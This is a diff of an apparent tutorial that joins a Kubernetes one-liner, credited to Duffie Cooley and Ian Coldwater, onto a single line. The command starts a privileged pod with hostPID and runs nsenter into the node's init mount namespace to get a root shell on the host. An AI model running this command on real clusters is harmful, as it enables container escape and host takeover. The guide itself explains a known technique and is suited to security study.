@@ -30,13 +30,7 @@ Duffie Cooley and Ian Coldwater pulled the following Kubernetes one-liner togeth
 Just run this:
 
 ```bash
-kubectl run r00t --restart=Never \
-  -ti --rm --image lol \
-  --overrides '{"spec":{"hostPID": true, \
-  "containers":[{"name":"1","image":"alpine",\
-  "command":["nsenter","--mount=/proc/1/ns/mnt","--",\
-  "/bin/bash"],"stdin": true,"tty":true,\
-  "securityContext":{"privileged":true}}]}}'
+kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine", "command":["nsenter","--mount=/proc/1/ns/mnt","--", "/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
 ```
 
 ### Step 2: Check for root in the process namespace
